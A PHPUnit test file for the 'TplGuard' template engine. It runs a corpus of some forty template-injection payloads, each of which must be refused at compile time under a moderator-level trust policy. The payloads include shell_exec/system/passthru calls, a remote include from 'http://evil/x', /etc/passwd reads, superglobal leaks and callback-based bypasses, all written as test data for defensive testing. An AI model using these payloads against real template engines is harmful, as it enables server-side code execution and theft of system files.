<?php
declare(strict_types=1);

namespace TplGuard\Tests;

use PHPUnit\Framework\TestCase;
use TplGuard\Engine;
use TplGuard\Exception\SecurityViolation;
use TplGuard\Security\TrustPolicy;

/**
 * The reported vulnerability class: a moderator who can edit post templates
 * injects template expressions that execute on the server.
 *
 * Each payload is rendered under the SKIN policy — the trust level a
 * moderator-editable theme gets — and must be refused at compile time.
 */
final class AttackCorpusTest extends TestCase
{
    private static string $work;

    public static function setUpBeforeClass(): void
    {
        self::$work = sys_get_temp_dir() . '/tplguard_atk_' . bin2hex(random_bytes(4));
        @mkdir(self::$work, 0777, true);
    }

    public static function tearDownAfterClass(): void
    {
        self::rrmdir(self::$work);
    }

    /** @dataProvider payloads */
    public function testPayloadIsBlocked(string $name, string $template, string $expectRule): void
    {
        $dir = self::$work . '/' . md5($name);
        @mkdir($dir, 0777, true);
        file_put_contents($dir . '/page.html', $template);
        $engine = new Engine($dir . '/cache', [TrustPolicy::skin($dir)]);

        $marker = self::$work . '/pwned_' . md5($name);
        @unlink($marker);

        try {
            $out = $engine->render('page', ['x' => 'safe', 'cmd' => 'id']);
            if ($expectRule === 'inert') {
                // Nothing executed; whatever the parser decided, the payload
                // must not have produced shell output or a file.
                $this->assertStringNotContainsString('uid=', $out);
                $this->assertStringNotContainsString('root', $out);
                return;
            }
            $this->fail("Payload '$name' was NOT blocked; output: " . substr($out, 0, 200));
        } catch (SecurityViolation $e) {
            $rules = array_map(fn ($f) => $f->rule, $e->analysis->errors());
            $this->assertContains($expectRule, $rules, "Payload '$name' blocked for the wrong reason: " . implode(',', $rules));
            $this->assertFileDoesNotExist($marker, "Payload '$name' executed code");
        }
    }

    public static function payloads(): iterable
    {
        // name => [template, expected rule]
        $cases = [
            'raw php block'            => ['{php}echo shell_exec("id");{/php}', 'php.block'],
            'discuz eval'              => ['<!--{eval echo "x";}-->', 'php.eval'],
            'inline php'               => ['{php echo 1;}', 'php.eval'],
            'brace eval'               => ['{eval system("id");}', 'php.eval'],
            'system call'              => ['{system("id")}', 'call.denied'],
            'exec via function'        => ['{exec("id")}', 'call.denied'],
            'shell_exec'               => ['{shell_exec("id")}', 'call.denied'],
            'passthru'                 => ['{passthru("id")}', 'call.denied'],
            'popen'                    => ['{popen("id","r")}', 'call.denied'],
            'proc_open'                => ['{proc_open("id",[],$p)}', 'call.denied'],
            'file write'               => ['{file_put_contents("/tmp/x","y")}', 'call.denied'],
            'include remote'           => ['{include("http://evil/x")}', 'call.denied'],
            'require'                  => ['{require("/etc/passwd")}', 'call.denied'],
            'eval modifier'            => ['{$x|eval:1}', 'filter.eval'],
            'call_user_func'           => ['{call_user_func("system","id")}', 'call.denied'],
            'create_function'          => ['{create_function("$a","system($a);")}', 'call.denied'],
            'assert string'            => ['{assert("phpinfo()")}', 'call.denied'],
            'superglobal server'       => ['{$_SERVER.SCRIPT_FILENAME}', 'expr.superglobal'],
            'superglobal env'          => ['{$_ENV.PATH}', 'expr.superglobal'],
            'globals'                  => ['{$GLOBALS.foo}', 'expr.superglobal'],
            'session'                  => ['{$_SESSION.user}', 'expr.superglobal'],
            'dynamic call'             => ['{$f(1)}', 'expr.dynamic_call'],
            'dynamic include'          => ['{include file=$tpl}', 'parse'],
            'static in cond'           => ['{if $x == Foo::BAR}x{/if}', 'expr.static'],
            'php short tag'            => ['<?php system("id"); ?>', 'php.block'],
            'inert backtick'           => ['{$x}`id`', 'inert'],
            'tag plugin'               => ['{tag:exec cmd=$cmd}', 'tag.plugin'],
            'unknown modifier'         => ['{$x|passthru}', 'filter.unknown'],
            'callback array_map'       => ['{array_map("system",["id"])|implode:""}', 'call.callback'],
            'callback array_filter'    => ['{array_filter(["x"],"system")|implode:""}', 'call.callback'],
            'callback via getenv'      => ['{array_map("getenv",["HOME"])|implode:""}', 'call.callback'],
            'callback file read'       => ['{array_map("file_get_contents",["/etc/passwd"])|implode:""}', 'call.callback'],
            'callback unserialize'     => ['{array_map("unserialize",["x"])|json}', 'call.callback'],
            'preg_replace e'           => ['{preg_replace("/.*/e","system(\'id\')","x")}', 'call.function'],
            'unserialize'              => ['{unserialize($x)}', 'call.denied'],
            'reflection'              => ['{ReflectionFunction("system")}', 'call.function'],
            'phpinfo'                  => ['{phpinfo()}', 'call.denied'],
            'getenv'                   => ['{getenv("PATH")}', 'call.denied'],
            'computed callable'        => ['{("sys"."tem")("id")}', 'expr.dynamic_call'],
            'inert variable variable'  => ['{$$x}', 'inert'],
            'raw php tag'              => ['<?php echo 1; ?>', 'php.block'],
            'concat call'              => ['{$a.$b()}', 'expr.dynamic_call'],
            'chained method magic'     => ['{$x->__construct()}', 'expr.method'],
            'dynamic property'         => ['{$x->$p}', 'expr.dynamic_property'],
        ];
        foreach ($cases as $name => [$tpl, $rule]) {
            yield $name => [$name, $tpl, $rule];
        }
    }

    private static function rrmdir(string $dir): void
    {
        if (!is_dir($dir)) {
            return;
        }
        $it = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator($dir, \FilesystemIterator::SKIP_DOTS),
            \RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($it as $f) {
            $f->isDir() ? @rmdir($f->getPathname()) : @unlink($f->getPathname());
        }
        @rmdir($dir);
    }
}
